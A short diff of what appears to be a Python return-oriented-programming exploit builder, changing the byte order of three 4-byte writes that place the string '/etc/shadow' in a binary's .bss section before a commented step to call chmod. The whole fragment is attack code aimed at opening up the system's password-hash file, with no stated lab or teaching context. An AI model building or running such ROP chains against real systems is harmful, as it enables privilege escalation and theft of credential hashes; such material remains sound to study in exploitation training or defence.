@@ -130,9 +130,9 @@ def build(leak, gadget_file, sled_length):
     string_location = adjuster(section('.bss', gadget_file))
     print('string_location:', hex(string_location))
 
-    rop = write4(rop, gadget_file, adjuster, string_location, b'/etc')
-    rop = write4(rop, gadget_file, adjuster, string_location + 4, b'/sha')
-    rop = write4(rop, gadget_file, adjuster, string_location + 8, b'dow\x00')
+    rop = write4(rop, gadget_file, adjuster, string_location, b'cte/')
+    rop = write4(rop, gadget_file, adjuster, string_location + 4, b'ahs/')
+    rop = write4(rop, gadget_file, adjuster, string_location + 8, b'\x00wod')
 
     # Now call chmod
 
